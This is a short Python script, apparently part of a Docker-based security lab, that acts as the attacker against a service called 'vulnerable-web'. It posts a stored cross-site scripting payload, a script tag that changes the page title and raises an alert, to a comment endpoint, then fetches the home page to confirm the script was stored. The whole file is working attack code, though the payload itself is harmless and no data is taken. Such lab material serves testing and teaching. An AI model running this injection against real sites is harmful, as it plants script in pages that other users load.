import requests
import time
import os

TARGET = os.environ.get('TARGET', 'http://vulnerable-web:3000')  # docker internal service name
print("Attacker running. Target:", TARGET)

payload = '<script>document.title = "XSS-EXECUTED"; alert("Stored XSS executed!")</script>'
data = {
    'name': 'attacker',
    'comment': payload
}

try:
    r = requests.post(f'{TARGET}/comment', data=data, timeout=5)
    print("Posted payload, status:", r.status_code)
except Exception as e:
    print("Error posting payload:", e)

# fetch home page to confirm payload stored (output raw HTML)
try:
    time.sleep(1)
    r2 = requests.get(f'{TARGET}/', timeout=5)
    print("Fetched page length:", len(r2.text))
    # print small preview
    print(r2.text[:500])
except Exception as e:
    print("Error fetching page:", e)
